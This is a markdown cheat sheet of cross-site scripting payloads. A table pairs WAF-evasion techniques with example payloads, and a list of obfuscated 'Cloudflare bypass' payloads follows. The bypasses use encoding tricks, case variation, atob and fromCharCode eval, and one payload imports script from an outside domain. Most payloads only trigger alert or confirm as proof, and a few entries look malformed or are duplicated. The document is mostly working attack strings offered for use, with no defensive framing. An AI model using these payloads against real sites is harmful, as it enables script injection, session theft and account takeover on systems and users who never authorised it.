

## xss paylaod

```
i2lte%22%3e%3cscript%3ealert(1)%3c%2fscript%3eayawz

```
# Bypassing WAF in XSS Attacks

Bypassing WAF (Web Application Firewall) in XSS (Cross-Site Scripting) attacks relies on exploiting various techniques and methods to bypass the protection put in place by the firewall. Below are some techniques and examples.

## Techniques and Examples

| **Technique**                                 | **Description**                                                                                                           | **Example**                                                                                                           |
|-----------------------------------------------|---------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| **Encoding**                                 | Input encoding can be used to confuse WAF and prevent malicious payload detection.                                         | URL Encoding: `<script>alert('XSS')</script>` encoded as `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`<br>HTML Entity Encoding: `&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;` |
| **Using Comments**                          | Some WAFs may ignore input if the code is split via comments.                                                              | `<scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>`                                                             |
| **Case Variation**                          | WAF can be case sensitive. Change the case to make the code undetectable.                                                 | `<ScRipT>alert('XSS')</sCrIpT>`                                                                                         |
| **Alternative Event Handlers**               | Exploit events in HTML that may not be strictly checked by WAF, such as onfocus or onmouseover.                           | `<img src="x" onerror="alert('XSS')">`<br>Replaced by `<input onfocus="alert('XSS')">`                               |
| **Padding Characters**                       | Add spaces or insignificant characters inside the malicious code to make it undetectable.                                  | `<scr ipt>alert('XSS')</scr ipt>`                                                                                       |
| **Use eval(), setTimeout(), or setInterval()** | Some WAFs scan for obvious code like alert() or document.write(). Using functions like eval() or setTimeout() can make code less obvious. | `<script>setTimeout(function(){alert('XSS')}, 100);</script>`                                                           |
| **JavaScript Coding Using String.fromCharCode** | Use String.fromCharCode function to generate JavaScript code dynamically.                                                | `<script>alert(String.fromCharCode(88,83,83));</script>` (prints "XSS")                                                |
| **DOM-based XSS Techniques**                 | Bypass WAF using techniques that rely on XSS in the DOM only.                                                               | ```javascript<br>var input = document.createElement('input');<br>input.setAttribute('onfocus', 'alert("XSS")');<br>document.body.appendChild(input);<br>input.focus();<br>``` |
| **Hiding Code Inside Unexpected Media**      | Embed XSS code inside non-traditional HTML elements, such as SVG files or titles.                                          | `<svg onload="alert('XSS')"></svg>`                                                                                     |
| **Complex Conditional Statements or Mathematical Functions** | Use conditional statements or mathematical operations to make malicious code less obvious.                                | `<script>if(1<2){alert('XSS')}</script>`                                                                                 |
| **JavaScript: In URL**                       | Insert JavaScript code inside a URL using the javascript: protocol.                                                       | `<a href="javascript:alert('XSS')">Click me</a>`                                                                       |
| **Exploit Weak or Non-Comprehensive Filters**| Some WAFs may not scan all input types or fields. Inject code in unexpected places.                                         | `<input type="hidden" value="<script>alert('XSS')</script>">`                                                          |

## Cloudflare Bypass Payloads

| **Payload**                                                                                 |
|---------------------------------------------------------------------------------------------|
| `<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>`                            |
| `"prompt(document.domain)"`                                                                 |
| `<img/src=x onError="${x};alert(Hello);">`                                                  |
| `<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt\`1\``                        |
| `<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>`                            |
| `%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e`                                              |
| `<select><style></select><svg onload=alert(1)></style>`                                    |
| `"><img src=x onerrora=confirm() onerror=confirm(1)>`                                      |
| `<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>`                           |
| `"><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>` |
| `%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E`                                      |
| `<img/src=x onError="${x};alert(Hello);">`                                                |
| `&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;`                          |
| `"><track/onerror='confirm\`1\`'>`                                                         |
| `<inpuT autofocus oNFocus="setTimeout(function() { /\/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/\/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;` |
| `<inpuT autofocus oNFocus="setTimeout(function() { /*\*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\*/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;` |
